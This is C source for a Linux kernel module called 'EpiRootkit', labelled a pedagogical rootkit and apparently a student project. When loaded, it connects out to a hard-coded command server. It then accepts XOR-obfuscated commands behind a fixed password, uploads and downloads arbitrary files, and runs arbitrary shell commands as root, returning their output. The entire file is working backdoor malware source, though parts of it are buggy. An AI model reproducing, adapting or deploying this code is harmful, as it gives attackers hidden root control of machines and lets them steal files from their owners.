#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

static struct rootkit_config {
    unsigned short port;
    char server_ip[16];
    size_t buffer_size;
    char xor_key[32];
} config = {
    .port = 4242,
    .server_ip = "192.168.15.6",
    .buffer_size = 2048,
    .xor_key = "epirootkit"
};

static struct socket *g_sock = NULL;
static struct task_struct *g_thread = NULL;

static void xor_cipher(char *data, size_t len) {
    size_t i;
    size_t key_len = strlen(config.xor_key);
    for (i = 0; i < len; i++)
        data[i] ^= config.xor_key[i % key_len];
}

static int send_data(const char *msg, size_t len) {
    struct msghdr msg_hdr = { 0 };
    struct kvec iov = { .iov_base = (char *)msg, .iov_len = len };
    return kernel_sendmsg(g_sock, &msg_hdr, &iov, 1, len);
}

static int receive_data(char *buf, size_t len) {
    struct msghdr msg_hdr = { 0 };
    struct kvec iov = { .iov_base = buf, .iov_len = len };
    return kernel_recvmsg(g_sock, &msg_hdr, &iov, 1, len, 0);
}

// --- AUTHENTICATION ---
static char rk_password[64] = "epirootkit";
static int is_authenticated = 0;

static int handle_auth(const char *cmd) {
    if (strncmp(cmd, "auth ", 5) == 0) {
        const char *pw = cmd + 5;
        if (strncmp(pw, rk_password, strlen(rk_password)) == 0) {
            is_authenticated = 1;
            send_data("OK", 2);
        } else {
            send_data("FAIL", 4);
        }
        return 1;
    }
    if (strncmp(cmd, "auth change ", 12) == 0) {
        const char *newpw = cmd + 12;
        size_t len = strlen(newpw);
        if (len > 0 && len < sizeof(rk_password)) {
            strncpy(rk_password, newpw, sizeof(rk_password)-1);
            rk_password[sizeof(rk_password)-1] = '\0';
            send_data("Password changed successfully", 27);
        } else {
            send_data("Password change failed", 22);
        }
        return 1;
    }
    return 0;
}

// --- FILE UPLOAD/DOWNLOAD ---
static int handle_upload(const char *cmd, int msglen) {
    if (strncmp(cmd, "upload ", 7) == 0) {
        char remote[256];
        int size;
        if (sscanf(cmd+7, "%255s %d", remote, &size) == 2 && size > 0) {
            struct file *fp = filp_open(remote, O_WRONLY|O_CREAT|O_TRUNC, 0600);
            if (IS_ERR(fp)) {
                send_data("Upload failed", 13);
                return 1;
            }
            char *buf = kmalloc(size, GFP_KERNEL);
            if (!buf) {
                filp_close(fp, NULL);
                send_data("Upload failed", 13);
                return 1;
            }
            int recvd = 0;
            while (recvd < size) {
                int r = receive_data(buf+recvd, size-recvd);
                if (r <= 0) break;
                recvd += r;
            }
            kernel_write(fp, buf, size, 0);
            filp_close(fp, NULL);
            kfree(buf);
            send_data("Upload success", 14);
            return 1;
        }
    }
    return 0;
}

static int handle_download(const char *cmd) {
    if (strncmp(cmd, "download ", 9) == 0) {
        char remote[256];
        if (sscanf(cmd+9, "%255s", remote) == 1) {
            struct file *fp = filp_open(remote, O_RDONLY, 0);
            if (IS_ERR(fp)) {
                send_data("Download failed", 15);
                return 1;
            }
            char buf[2048];
            int r = kernel_read(fp, 0, buf, sizeof(buf));
            filp_close(fp, NULL);
            if (r > 0) {
                send_data(buf, r);
            } else {
                send_data("Download failed", 15);
            }
            return 1;
        }
    }
    return 0;
}

static int command_loop(void *data) {
    char *buf = kmalloc(config.buffer_size, GFP_KERNEL);
    if (!buf) return -ENOMEM;
    is_authenticated = 0;
    while (!kthread_should_stop()) {
        int ret;

        memset(buf, 0, config.buffer_size);
        ret = receive_data(buf, config.buffer_size - 1);
        if (ret <= 0) {
            msleep(3000);
            continue;
        }

        xor_cipher(buf, ret);
        // --- AUTHENTICATION ---
        if (!is_authenticated) {
            handle_auth(buf);
            continue;
        }
        // --- AUTH CHANGE ---
        if (handle_auth(buf)) continue;
        // --- UPLOAD ---
        if (handle_upload(buf, ret)) continue;
        // --- DOWNLOAD ---
        if (handle_download(buf)) continue;
        // --- EXEC ---
        if (strncmp(buf, "exec ", 5) == 0) {
            char *cmd = buf + 5;
            char *argv[] = { "/bin/sh", "-c", cmd, NULL };
            char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
            struct subprocess_info *info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
            if (info)
                call_usermodehelper_exec(info, UMH_WAIT_PROC);
            struct file *fp = filp_open("/tmp/.rk_tmp", O_RDONLY, 0);
            if (!IS_ERR(fp)) {
                char output[2048] = {0};
                int r = kernel_read(fp, 0, output, sizeof(output) - 1);
                filp_close(fp, NULL);
                xor_cipher(output, r);
                send_data(output, r);
            }
            continue;
        }
        // Unknown command
        send_data("Unknown command", 15);
    }
    kfree(buf);
    return 0;
}

static int connect_to_server(void) {
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(config.port),
        .sin_addr.s_addr = in_aton(config.server_ip)
    };

    int ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock);
    if (ret < 0) return ret;

    while ((ret = g_sock->ops->connect(g_sock, (struct sockaddr *)&addr, sizeof(addr), 0)) < 0)
        msleep(3000);

    return 0;
}

static int __init rk_init(void) {
    int ret = connect_to_server();
    if (ret < 0) return ret;

    g_thread = kthread_run(command_loop, NULL, "rk_cmd_thread");
    if (IS_ERR(g_thread)) return PTR_ERR(g_thread);

    return 0;
}

static void __exit rk_exit(void) {
    if (g_thread) kthread_stop(g_thread);
    if (g_sock) sock_release(g_sock);
}

module_init(rk_init);
module_exit(rk_exit);
